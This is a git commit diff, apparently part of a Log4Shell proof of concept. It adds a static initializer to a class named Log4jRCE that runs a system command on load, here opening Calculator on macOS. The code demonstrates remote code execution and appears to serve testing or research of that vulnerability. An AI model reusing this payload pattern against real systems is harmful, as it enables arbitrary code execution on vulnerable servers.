d673a83dd01d0888d4c1e7ef929ba4c4a2193612
xiangkun.tao <torrific55@gmail.com>
2021-12-10 14:45:09 +0900

    edited for MacOS

--- src/main/java/Log4jRCE.java
+++ src/main/java/Log4jRCE.java
@@ -1,4 +1,11 @@
 public class Log4jRCE {
-
-
+    // payload
+    static {
+        try {
+            String[] cmdline = {"open", "-a", "Calculator"};
+            java.lang.Runtime.getRuntime().exec(cmdline).waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 }
